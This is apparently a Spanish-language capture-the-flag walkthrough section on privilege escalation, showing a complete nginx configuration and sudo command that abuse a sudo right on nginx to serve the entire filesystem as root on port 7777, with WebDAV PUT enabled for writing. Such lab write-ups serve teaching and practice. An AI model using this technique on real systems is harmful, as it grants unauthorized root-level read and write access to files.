Escalada de privilegios

Una vez dentro si hacemos sudo -l podemos ver que podemos ejecutar /usr/sbin/nginx como root. Esto nos lleva a poder levantar un servicio web como si fuéramos root para poder leer todo lo que hay en el directorio root.

Nos vamos al directorio /tmp para tener permisos de escritura y demás y creamos un archivo .conf para enginx con el siguiente contenido:

user root;
worker_processes auto;
pid /run/nginx2.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
worker_connections 1024;
}
http {
server {
listen 7777;
location / {
root /;
autoindex on;
dav_methods PUT;
}
}
}

Y después simplemente tenemos que añadir nuestra configuración a nginx con el siguiente comando: sudo /usr/sbin/nginx -c /tmp/pwnd.conf.

Si ahora accedemos a la web por el puerto 7777 podremos ver todo el contenido de root.
